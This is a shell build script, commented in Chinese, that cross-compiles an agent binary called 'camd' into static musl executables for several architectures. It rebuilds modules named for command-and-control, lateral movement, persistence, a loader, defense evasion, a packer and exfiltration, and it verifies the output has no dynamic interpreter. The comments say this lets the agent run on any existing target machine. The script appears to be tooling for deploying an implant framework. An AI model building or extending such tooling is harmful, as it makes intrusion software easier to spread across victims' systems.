#!/bin/sh
# 交叉构建：在 x86_64 构建机上产出真实 arm64 / arm / 386 的 camd。
#
# 【为什么不用 apt 装交叉编译器】
#   实测本类沙盒 apt 源 403、无 aarch64-linux-gnu-gcc，此前多轮据此把 R4
#   判成"不可验证"。但 PyPI 可达，ziglang 以 wheel 形式分发完整 zig 编译器
#   （含全目标 musl 头与静态库），装完即可 zig cc -target aarch64-linux-musl。
#   "没有交叉编译器"是没找对渠道，不是环境不具备。
#
# 【为什么必须静态】
#   动态 camd 要求 GLIBC_2.34，存量目标机一律 not found；musl 目标机连
#   解释器路径都对不上。zig 默认链接 musl 且 -static 后无 INTERP 段，
#   可在任意 Linux 内核直接执行。见 agent_windows/Makefile 的 STATIC 开关。
#
# 【为什么在仓库副本里构建】
#   上游静态库（libp2p.a / libpersist.a 等）若沿用 x86_64 产物，ld.lld 报
#   "incompatible with aarch64linux"。必须与主程序同目标重编，且不能就地
#   覆盖原生产物（原生回归还要用）。故复制到 $WORK 后 clean 再编。
#
# 用法: sh scripts/build_cross.sh [aarch64|arm|x86_64|i386]
set -eu

TARGET="${1:-aarch64}"
case "$TARGET" in
    aarch64) ZT="aarch64-linux-musl";     OUT="camd-aarch64-musl" ;;
    arm)     ZT="arm-linux-musleabihf";   OUT="camd-arm-musl" ;;
    x86_64)  ZT="x86_64-linux-musl";      OUT="camd-x86_64-musl" ;;
    i386)    ZT="x86-linux-musl";          OUT="camd-i386-musl" ;;
    *) echo "未知目标: $TARGET" >&2; exit 2 ;;
esac

# 取得 zig。优先用已装的，否则从 PyPI 装。
if ! command -v zig >/dev/null 2>&1; then
    python3 -c "import ziglang" >/dev/null 2>&1 || pip install -q ziglang
    ZIGDIR="$(python3 -c 'import ziglang,os;print(os.path.dirname(ziglang.__file__))')"
    PATH="$ZIGDIR:$PATH"; export PATH
fi

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK="${CROSS_WORK:-/tmp/cross-$TARGET}"
ART="$ROOT/artifacts"

rm -rf "$WORK"
cp -a "$ROOT" "$WORK"
cd "$WORK"
rm -rf */build

export CC="zig cc -target $ZT"
export STATIC=1

# 逐个上游模块重编。09_persistence / 20_packer 的"失败"只在测试二进制
# （前者 setenv 在严格 C99 下未声明，后者 test_poly_win64 是 x86-64 专用），
# 库本身已产出，故不因此中止——但要把这个取舍写清楚，别让后人误读。
for m in 00_crypto 02_c2 08_lateral 09_persistence 14_p2p \
         17_loader 19_defense 20_packer 21_exfil 24_front 25_tls; do
    make -C "$m" >/dev/null 2>&1 || echo "[INFO] $m 有目标未编出（多为 x86 专用测试）"
done

cd agent_windows
make build/linux/camd

mkdir -p "$ART"
cp build/linux/camd "$ART/$OUT"

python3 - "$ART/$OUT" <<'PY'
import struct, sys
d = open(sys.argv[1], 'rb').read()
cls = d[4]                       # 1=ELF32 2=ELF64
# 【历史 bug】这里曾无条件按 ELF64 布局解析（e_phoff@32、e_phentsize@54）。
# arm/i386 是 ELF32：e_phoff@28(4B)、e_phentsize@42、e_phnum@44。
# 按 64 位偏移读 32 位文件会得到荒谬的 phoff（实测 3.6e17）并抛
# struct.error —— 而此时产物**已经拷贝完成**，脚本却以 rc=1 结束，
# 表现为"构建失败"而产物其实是对的。判据必须按 EI_CLASS 分支。
if cls == 2:
    phoff, = struct.unpack_from('<Q', d, 32)
    phentsize, phnum = struct.unpack_from('<HH', d, 54)
else:
    phoff, = struct.unpack_from('<I', d, 28)
    phentsize, phnum = struct.unpack_from('<HH', d, 42)
interp = any(struct.unpack_from('<I', d, phoff + i * phentsize)[0] == 3
             for i in range(phnum))
print("[OK] %s magic=%s class=%s machine=%d %s size=%d"
      % (sys.argv[1], d[:4].hex(), "ELF64" if cls == 2 else "ELF32",
         struct.unpack_from('<H', d, 18)[0],
         "静态" if not interp else "动态(有INTERP)", len(d)))
PY
